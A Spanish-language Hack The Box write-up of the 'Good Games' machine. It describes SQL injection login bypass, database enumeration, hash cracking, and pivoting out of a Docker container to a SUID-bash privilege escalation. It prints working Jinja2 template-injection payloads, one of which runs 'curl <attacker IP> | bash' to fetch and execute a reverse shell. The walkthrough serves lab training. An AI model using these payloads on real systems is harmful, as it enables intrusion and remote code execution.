___

# Máquina Good Games (HTB)

IP atacante: 10.10.17.214
IP víctima: 10.129.60.137

Realizamos un ping a la máquina para ver si tenemos conectividad

![[gg_ping.png]]

TTL = 63 -> Máquina Linux

___

# Reconocimiento y enumeración de puertos abiertos

Lanzamos un nmap contra la máquina de la víctima para ver posibles puertos abiertos

![[gg_nmap.png]]

Puertos abiertos:
- 80 HTTP | Werkzeug 2.0.2 Python 3.9.2

![[gg_whatweb.png]]

Al entrar a la web podemos ver una página de juegos, además podemos iniciar sesión.

![[gg_http.png]]

Si exploramos en la parte de blog, podemos ver usuarios como `admin` o `Hitman`

![[gg_users.png]]

Entonces nos da una pista de que podría existir el usuario `admin` en el sistema

En el panel de login, podemos ingresar un `email` y una `password`, probamos con `test@test | test`

![[gg_login.png]]

![[gg_error500.png]]

Nos tira un internal server error. Para entrar, podriamos probar usar un ataque ``SQL injection``

![[gg_sqli.png]]

Dado que no nos interpreta bien los caracteres, enviamos la petición por BurpSuite para modificarla allí.

# Explotación y enumeración de la base de datos

Interceptamos la petición, la modificamos, urlencodeamos y enviamos.

![[gg_burp.png]]

![[gg_loginsuccess.png]]

Dentro de la cuenta de admin, podemos ver que hay otra página de configuración, asi que entramos y nos encontramos con un panel de autenticación ``Flask Volt - Sign IN``

![[gg_authpanelflask.png]]

Volvemos a la respuesta de la petición de BurpSuite, podemos ver que pone un `Login Success` y bajando más, nos puse un `Welcome admin`, esto quiere decir que nos está mostrando un valor el cual es el nombre de usuario, asi que empezamos a enumerar la base de datos.

![[gg_burp2.png]]



Ahora probamos a ver cuántas tablas tiene la consulta que corre por detrás, primero probamos con 10 y vamos disminuyendo hasta encontrar que algo en la respuesta cambia, lo que indicaría que dimos con el número exacto. Nos fijamos en el ``Content Length``, ya que este indica el tamaño de la página:

Con 10:

![[gg_10tables.png]]

Con 4:

![[gg_4tables.png]]

Con 4 cambia, asi que tenemos 4 columnas en la consulta.

Simulada:

```SQL
SELECT x,y,z,p FROM (?)
```

Ahora enumeramos bases de datos con la siguiente inyección:

![[gg_enumdb.png]]

Bases de datos:
- information_schema
- main

Enumeración de tablas:

![[gg_enumtables.png]]

Para que esto sea más sencillo de leer, podemos usar ``curl`` y un bucle ``for`` para iterar y mostrar cada tabla.

![[gg_scripttables.png]]

![[gg_tableuser.png]]

Podemos ver la tabla `user`, asi que enumeramos las columnas:

![[gg_columnsname.png]]

Ahora enumeramos los `nombres` y `contraseñas`:

![[gg_useradmin.png]]

Es una contraseña hasheada en `md5`, asi que usamos el recurso online `Crack-Station` para descifrarla

![[gg_hashcrack.png]]

Asi que tenemos el usuario `admin` y la contraseña `superadministrator`, por lo que probamos a entrar al sitio de administración

Tenemos acceso y podemos ver el panel de admin

![[gg_adminpanel.png]]

En el apartado de `Settings` podemos cambiar la nformación del usuario, asi que probamos si es vulnerable a SSTI con el payload `{{ 7*7 }}`

![[gg_sstiadmin.png]]

Vemos el resultado `49` en la parte del nombre, asi que inyectamos el siguiente payload para ver si logramos RCE, posteriormente una reverse shell.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```


![[gg_rceid.png]]

Vemos que existe RCE, asi que nos ponemos en escucha por el puerto 443 con `netcat`, creamos un archivo `html` con el siguiente contenido:

![[gg_rvshellssti.png]]

abrimos un servidor python en el directorio donde esta este archivo y mandamos el siguiente payload:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.17.214 | bash').read() }}
```

![[gg_shell.png]]

Aplicamos un tratamiento de tty para movernos comodamente por la consola

# Pivoting

Somos el usuario root y nuestra ip es `172.19.0.2`, la cual nos asigna Docker, pero también debe haber una máquina `172.19.0.1`

![[gg_hostname.png]]

![[gg_route.png]]

También encontramos el home del usuario `augustus` y la flag del user dentro

![[gg_flaguser.png]]

pero si nos fijamos en el ``/etc/passwd``, el único usuario es `root`, pero está el `/home` de augustus, además de que al hacer un `ls -l` en su home, vemos que pertenece al grupo 1000, pero dicho grupo tampoco está en `/etc/groups`.

![[gg_passwd.png]]

Esto nos quiere decir que se está jugando con monturas, es decir, el `/home` del usuario `augustus` está montado en el contenedor de `root`.

Lo podemos ver con el comando `mount`

![[gg_mount.png]]

Entonces, como estamos en la misma red que el contenedor principal, podemos realizar un escaneo de puertos para saber cuáles están abiertos, por lo que construimos un script.

![[gg_scanportscript.png]]

Lo encodeamos en base64 para pasarlo a la otra víctima ya que no tiene `nano`

```bash
base64 -w 0 scanport.sh | xclip -sel clip 
```

![[gg_base63decode.png]]

Al ejecutar el script, nos reportará que el puerto 22 está abierto, asi que probamos a reutilizar las credenciales de `admin` para el usuario `augustus`.

![[gg_useraugustus.png]]

# Escalar privilegios

Ya que el `/home` de `augustus` está dentro del contenedor con el usuario `root`, podemos copiar la bash y cambiar el propietario para que sea `root:root`, de tal forma que ahora puedo agregarle permisos SUID a dicha bash y volver a conectarme por ssh al usuario `augustus` e ir a su home.

Vemos el permiso SUID asi que podemos lanzar una bash con privilegios de administrador y ver la flag.

![[gg_flagroot.png]]